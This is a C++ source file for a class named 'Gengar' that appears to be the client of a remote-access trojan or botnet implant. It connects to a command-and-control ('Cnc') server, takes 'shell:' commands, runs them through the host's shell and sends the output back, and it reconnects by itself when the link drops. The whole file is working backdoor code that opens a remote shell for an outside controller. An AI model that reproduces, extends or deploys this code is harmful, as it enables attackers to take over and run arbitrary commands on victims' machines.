#include <iostream>
#include "gengar.h"

void Gengar::ListenForCommand()
{
	char type_content_delimiter = ':';

	while (true)
	{
		try
		{
			std::string input = m_client.Receive();
			size_t delimiter_index = input.find(type_content_delimiter);

			if (delimiter_index == std::string::npos)
				m_client.Send("Invalid command.\n");
			else
			{
				std::string type = input.substr(0, delimiter_index);
				std::string content = input.substr(delimiter_index + 1, std::string::npos);
				RouteCommand(type, content);
			}
		}
		catch (boost::system::system_error&)
		{
			ConnectToCnc();
			ListenForCommand();
		}
	}
}

void Gengar::RouteCommand(std::string& type, std::string& content)
{
	std::string output;

	if (type == "shell")
		output = m_machine.RunShellCommand(std::move(content));
	else
		output = "Unknown command type.\n";

	m_client.Send(std::move(output));
}


void Gengar::ConnectToCnc()
{
	m_client.Connect();
}
